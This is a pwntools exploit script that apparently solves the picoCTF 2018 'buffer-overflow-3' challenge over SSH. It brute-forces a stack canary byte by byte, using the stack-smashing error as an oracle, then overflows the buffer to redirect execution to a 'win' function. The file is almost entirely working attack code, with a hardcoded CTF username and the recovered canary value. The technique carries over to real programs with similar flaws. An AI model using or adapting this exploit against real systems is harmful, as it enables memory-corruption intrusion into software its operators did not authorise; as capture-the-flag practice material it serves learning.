import argparse
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

# cmdline argument - how to connect to binary
parser = argparse.ArgumentParser()
parser.add_argument("--local", help="Run exploit locally", action="store_true")
parser.add_argument("--attach", help="Run exploit locally and attach debugger", action="store_true")
parser.add_argument("--remote", help="Run exploit on remote service", action="store_true")
parser.add_argument("--ssh", help="Run exploit on SSH server", action="store_true")
args = parser.parse_args()

# GDB commands
debugging = False
gdb_cmd = [
	"c"
]

# Binary names
bin_fname = './vuln'
libc_fname = ''

# Remote
IP = ''
PORT = 0

# SSH
URL = '2018shell2.picoctf.com'
username = 'escapewq'
password = ''
bin_abs_path = '/problems/buffer-overflow-3_4_931796dc4e43db0865e15fa60eb55b9e'

# Create ELF objects
e = ELF(bin_fname)
libc = ELF(libc_fname) if libc_fname else None
x64 = e.bits != 32

# Command line args
# e.g. arg1 = cyclic_find('ahaa') * 'a' + '\xbd\x86\x04\x08' + 'a' * 4 + p32(next(e.search('/bin/sh')))
arg1 = ''
proc_args = [bin_fname, arg1]

if args.remote:
	p = remote(IP, PORT)
elif args.local or args.attach:
	p = process(proc_args)
	if args.attach:
		gdb.attach(p, gdbscript="\n".join(gdb_cmd))
elif args.ssh:
	s = ssh(host=URL, user=username, password=password)
	s.set_working_directory(bin_abs_path)
else:
	p = gdb.debug(proc_args, gdbscript="\n".join(gdb_cmd))
	debugging = True

"""
	Exploit

	Examples:
	func_offset = libc.symbols['puts'] 	# Offset in libc
	puts_addr = p32(e.got['puts'])
	main = e.symbols['main']
	addr_string = next(e.search('/bin/cat flag.txt'))
"""

# p.sendline(cyclic(100, n=8 if x64 else 4))
# buf = cyclic_find('', n=8 if x64 else 4) * 'a'

def get_next_canary_byte(s, cur_canary):
	guess = 0
	should_continue = True

	while should_continue and guess < 256:
		p = s.process(proc_args)
		p.recvuntil('How Many Bytes will You Write Into the Buffer?\n> ')
		p.sendline(str(33 + len(cur_canary)))
		p.recvuntil('Input> ')

		buf = 'a' * 32
		buf += cur_canary
		buf += chr(guess)
		p.send(buf)
		if '*** Stack Smashing Detected ***' in p.recvline():
			guess += 1
		else:
			should_continue = False
		p.close()

	if guess == 256:
		print "Error!"
		import sys
		sys.exit(1)
	return chr(guess)

# canary = ''
# while len(canary) < 4:
# 	canary += get_next_canary_byte(s, canary)
# print [ord(y) for y in canary]

# canary = [60, 122, 79, 37]
canary = '<zO%'
p = s.process(proc_args)
p.recvuntil('How Many Bytes will You Write Into the Buffer?\n> ')
p.sendline(str(32 + 4 + 16 + 4))
p.recvuntil('Input> ')

buf = 'a' * 32
buf += canary
buf += 'b' * 16
buf += p32(e.symbols['win'])
p.send(buf)
p.interactive()
